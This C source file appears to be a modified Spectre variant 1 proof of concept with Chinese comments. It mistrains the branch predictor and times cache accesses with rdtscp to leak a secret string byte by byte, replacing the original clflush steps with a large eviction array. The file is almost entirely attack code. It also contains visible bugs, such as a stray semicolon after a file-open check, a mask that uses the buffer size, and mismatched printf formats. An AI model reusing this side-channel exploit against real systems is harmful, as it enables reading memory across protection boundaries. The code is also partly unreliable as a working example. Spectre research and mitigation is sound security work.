#include <stdio.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/* sscanf_s only works in MSVC. sscanf should work with other compilers*/
#ifndef _MSC_VER
#define sscanf_s sscanf
#endif

#define size 20*1024*1024

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[size];
// uint8_t random[size];

int *elements;

char* secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

void victim_function(size_t x)
{
	if (x < array1_size)
	{

		temp &= array2[array1[x] * 512];
	}
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
#define CACHE_MISS_THRESHOLD (80) /* assume cache miss if time >= threshold */

// const int size = 20*1024*1024; // Allocate 20M. Set much larger then L2
// char *c = (char *)malloc(size);
// char c[20*1024*1024];


int prime() {
    // int i, junk = 0;
    // for (i = 0; i < 256; i++)
    // junk += array2[i * 512];
    // return junk;
	for (int j = 0; j < size; j++)
	   {
         array2[j] = j+256;
	   }
}

void probe(int junk, int tries, int results[256]) {
    int i, mix_i;
    volatile uint8_t *addr;
    register uint64_t time1, time2;
    FILE *fp;
	if ((fp = fopen("log", "a")) == NULL);
	{
		printf("文件开始写入\n");
	}

    for (i = 0; i < size; i++) {
        mix_i = ((i * 167) + 13) & size;
        addr = &array2[mix_i];
        // addr = &array2[mix_i];
        time1 = __rdtscp(&junk); /* READ TIMER */
        junk = *addr; /* MEMORY ACCESS TO TIME */
        time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
		fprintf(fp, "%d \t %lf\n", mix_i,time2);
        if (time2 >= CACHE_MISS_THRESHOLD && (mix_i/512) != array1[tries % array1_size])
        	results[(mix_i/512)]++; /* cache hit - add +1 to score for this value */
    }
	fprintf(fp, "\n\n\n\n\n\n\n\n");
	fclose(fp);
}

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
	static int results[256];
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t* addr;

	for (i = 0; i < 256; i++)
		results[i] = 0;
	for (tries = 10; tries > 0; tries--)
	{
		// for (i = 0; i < 256; i++)
		// 	_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

		// training_x = tries % array1_size;
		// for (j = 29; j >= 0; j--)
		// {
		// 	_mm_clflush(&array1_size);
		// 	for (volatile int z = 0; z < 100; z++)
		// 	{
		// 	} /* Delay (can also mfence) */

		// 	x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
		// 	x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
		// 	x = training_x ^ (x & (malicious_x ^ training_x));
		// 	victim_function(x);
		// }
        prime();

// for (i = 0; i < 256; i++)
// 		results[i] = 0;

		/* Flush array2[256*(0..255)] from cache */
		/*将缓存清空，_mm_clflush可以使得指定的缓存行无效化*/
		 //for (i = 0; i < 256; i++)
		 	//_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
		//_mm_clflush_self();
		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
	    /*30个循环，每训练5次，攻击1次*/
		training_x = tries % array1_size;
		for (j = 10; j >= 0; j--)
		{
			//_mm_clflush(&array1_size);
			prime();
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));
			victim_function(x);
		}

    FILE *fp;
	if ((fp = fopen("log", "a")) == NULL);
	{
		printf("文件开始写入\n");
	}
     for (i = 0; i < size; i++) {
        //mix_i = ((i * 167) + 13) & size;
		//printf("%d\n",elements[0]);
		//printf("ddddddd\n");
		mix_i = *(elements+i);
		//printf("%d\n",mix_i);
        addr = &array2[mix_i];
        // addr = &array2[mix_i];
        time1 = __rdtscp(&junk); /* READ TIMER */
        junk = *addr; /* MEMORY ACCESS TO TIME */
        time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
		fprintf(fp, "%d \t %lf\n", mix_i,time2);
        if (time2 >= CACHE_MISS_THRESHOLD && ((mix_i/512)%256) != array1[tries % array1_size])
        results[(mix_i/512)%256]++; /* cache hit - add +1 to score for this value */
    }
	fprintf(fp, "\n\n\n\n\n\n\n\n");
	fclose(fp);
        

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		// for (i = 0; i < 256; i++)
		// {
		// 	mix_i = ((i * 167) + 13) & 255;
		// 	addr = &array2[mix_i * 512];
		// 	time1 = __rdtscp(&junk); /* READ TIMER */
		// 	junk = *addr; /* MEMORY ACCESS TO TIME */
		// 	time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */

		// 	if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
		// 		results[mix_i]++; /* cache hit - add +1 to score for this value */
		// }

		/* Locate highest & second-highest results results tallies in j/k */

		/*从results中提取命中次数最多的以及第二多的字符和坐标*/
		j = k = -1;
		for (i = 0; i < 256; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= junk; /* use junk so code above won't get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int main(int argc, const char* * argv)
{
	elements = malloc(sizeof(int)*size);

	// inizialize
	for (int i = 0; i < size; ++i)
	elements[i] = i;

	for (int i = size - 1; i > 0; --i) {
	// generate random index
	int w = rand()%i;
	// swap items
	int t = elements[i];
	elements[i] = elements[w];
	elements[w] = t;
	}

	printf("Putting '%s' in memory\n", secret);
	/*secret 		表示我们要窃取的密码       （地址）
	  array1 		表示我们正常申请的一个数组  （地址）
	  malicious_x	表示secret以及array1的差值，我们可以通过array1[malicious_x]来读取secret
	  score[2]		score[0]表示最高分，score[1]表示第二高分
	  value[2]		value[0]表示侦测出来最高分对应的字符，value[1]表示第二高分对应的字符
	*/

	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
	int score[2], len = strlen(secret);
	uint8_t value[2];

	for (size_t i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
	
	if (argc == 3)
	{
		/*
			上面已经指定了默认的secret。
			此处允许在命令行后附加参数来自定义secret的值。
		*/
		sscanf_s(argv[1], "%p", (void * *)(&malicious_x));
		malicious_x -= (size_t)array1; /* Convert input value into a pointer */
		sscanf_s(argv[2], "%d", &len);
	}

	printf("Reading %d bytes:\n", len);
	while (--len >= 0)
	{
		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
		/*此函数为程序核心，每次探测 要窃取的密码的 一位字符*/
		readMemoryByte(malicious_x++, value, score);
		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
		/*输出探测到的字符和备选字符，31到127为可见字符*/
		printf("0x%02X='%c' score=%d ", value[0],
		       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X='%c' score=%d)", value[1],
				   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
				   score[1]);
		printf("\n");
	}
#ifdef _MSC_VER
	printf("Press ENTER to exit\n");
	getchar();	/* Pause Windows console */
#endif
	return (0);
}
